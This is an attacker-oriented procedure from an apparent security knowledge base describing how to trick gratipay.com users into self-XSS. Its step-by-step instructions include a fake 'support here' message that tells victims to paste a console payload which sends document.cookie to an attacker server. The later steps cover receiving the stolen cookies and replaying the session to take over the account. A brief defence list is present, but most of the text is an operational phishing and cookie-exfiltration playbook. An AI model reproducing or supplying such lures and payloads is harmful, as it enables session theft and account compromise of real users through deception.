---
tags:
  - self-xss
  - xss
  - social-engineering
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Phishing]]'
updated_at: '2025-12-14T03:15:31.706Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 0eeac50d-1fba-4a8b-b45c-2725d20c5947
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Phishing]]'
---
# Trick-User-into-Self-XSS-JavaScript-Injection

## Summary

This procedure outlines how to socially engineer a victim into executing malicious JavaScript on their own browser session on gratipay.com, exploiting the site's lack of self-XSS protections like console warnings or input field guards, leading to potential session hijacking or data theft.

## Description

Self-XSS occurs when a user is tricked into injecting and running JavaScript in their own browser context, such as via the developer console or address bar. Gratipay.com does not implement protections seen on sites like Facebook, such as scripts that detect and block JS pasting into consoles or input fields. The attacker crafts a convincing pretext (e.g., "Paste this code to fix your account issue") to get the victim to run a payload that exfiltrates session data. This requires user interaction but can compromise the account if the victim is authenticated. Expected outcomes include stealing cookies, tokens, or performing unauthorized actions.

## Requirements

1. Access to a communication channel with the victim (e.g., email, Discord, or social media)
2. Victim must be logged into gratipay.com in their browser
3. Attacker-controlled server to receive exfiltrated data (e.g., a simple HTTP endpoint)
4. Basic knowledge of JavaScript for payload crafting

## Defense

Defensive measures and detection strategies:

- Implement client-side protections like console banners warning against JS execution or scripts that override paste events in dev tools
- Educate users on social engineering risks and avoiding untrusted code execution
- Monitor for anomalous data exfiltration from client-side (e.g., unexpected outbound requests to unknown domains)
- Use Content Security Policy (CSP) to restrict script execution, though self-XSS may bypass if console is used

## Objectives

1. Induce the victim to execute attacker-controlled JavaScript in their session
2. Exfiltrate sensitive data like session cookies or account details
3. Achieve account compromise without direct site vulnerability exploitation

## Instructions

### Step 1: Craft Social Engineering Message

**Context**: Prepare a deceptive message to lure the victim into believing they need to run code for troubleshooting or verification.

**Instructions**: Compose a message like: "Hi, support here. To resolve your Gratipay login issue, open your browser console (press F12), go to the Console tab, and paste this: `console.log('Debugging...'); fetch('https://yourserver.com/log?data=' + encodeURIComponent(document.cookie));` Then press Enter." Ensure the payload is obfuscated if needed to avoid suspicion.

> This step sets up the pretext; no code execution yet.

### Step 2: Deliver Message and Instruct Execution

**Context**: Send the message and guide the victim to perform the self-injection.

**Instructions**: Deliver via preferred channel. Once they respond, reiterate: "Paste the exact code into the console and hit Enter. It will log your session for fixing." The payload executes immediately upon pasting and entering, sending cookies to your server since gratipay.com lacks protections to prevent this.

> Expected behavior: JS runs in the page context, accessing DOM and cookies. No server-side validation blocks console execution.

### Step 3: Receive and Validate Exfiltration

**Context**: Collect the stolen data and confirm compromise.

**Instructions**: Set up a listener on your server (e.g., using netcat or a web server). Upon execution, data arrives as a GET request. Use it to replay the session (e.g., import cookies into your browser) and access the victim's account.

> Success looks like receiving a request with cookie values; test by logging into gratipay.com with the stolen session.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Initial Access]]

### Techniques

- [[JavaScript]]
- [[Phishing]]

### Sub-Techniques

- None

## Commands Used

- None

## Tools Used

- None

## Tags

- [[self-xss]]
- [[xss]]
- [[social-engineering]]
- [[web-exploitation]]
